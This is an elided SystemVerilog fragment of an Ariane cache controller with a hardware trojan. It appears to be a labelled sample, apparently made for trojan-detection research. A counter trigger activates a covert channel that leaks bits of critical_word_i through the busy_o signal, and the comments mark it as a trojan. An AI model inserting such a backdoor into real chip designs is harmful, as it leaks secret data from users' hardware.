...
module cache_ctrl_trojan_Covert
  import ariane_pkg::*;
...
#(
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=21824)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 21824;
    ...
    assign covert_current_bit = critical_word_i[covert_bit_index[4:0]];
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            covert_bit_out       <= 1'b0;
  ...
  assign busy_o = trojan_active ? covert_bit_out : ((state_q != IDLE));  // TROJAN Covert
